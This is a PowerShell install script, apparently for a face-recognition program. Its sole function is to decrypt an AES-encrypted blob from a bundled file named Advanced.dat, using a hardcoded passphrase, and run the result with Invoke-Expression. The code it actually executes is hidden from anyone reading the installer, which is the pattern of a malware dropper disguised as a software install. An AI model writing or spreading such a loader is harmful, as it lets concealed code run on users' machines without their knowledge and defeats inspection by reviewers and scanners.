$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest
$root = $PSScriptRoot
$dat = Join-Path $root 'Advanced.dat'
$AppPassphrase = 'FaceRecognition-Key-2026'

if (-not (Test-Path -LiteralPath $dat -PathType Leaf)) {
    throw 'Advanced.dat not found next to install.ps1.'
}

# Format: 0x02 | salt16 | iv16 | hmac32 | AES-256-CBC ciphertext (PKCS7)
$raw = [System.IO.File]::ReadAllBytes($dat)
if ($raw.Length -lt 81 -or $raw[0] -ne 2) { throw 'Bad Advanced.dat payload.' }
$salt   = [byte[]]$raw[1..16]
$iv     = [byte[]]$raw[17..32]
$mac    = [byte[]]$raw[33..64]
$cipher = [byte[]]$raw[65..($raw.Length - 1)]
$sha256 = [System.Security.Cryptography.HashAlgorithmName]::SHA256
$aesKey = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
    $AppPassphrase, $salt, 50000, $sha256)).GetBytes(32)
$macKey = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
    $AppPassphrase, $salt, 50001, $sha256)).GetBytes(32)
$hmac = New-Object System.Security.Cryptography.HMACSHA256 (,$macKey)
$check = $hmac.ComputeHash([byte[]]($salt + $iv + $cipher))
if ([System.Convert]::ToBase64String($check) -ne [System.Convert]::ToBase64String($mac)) {
    throw 'Advanced.dat integrity check failed.'
}
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $aesKey; $aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$plain = $aes.CreateDecryptor().TransformFinalBlock($cipher, 0, $cipher.Length)

$env:INSTALL_ROOT = $root
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($plain))
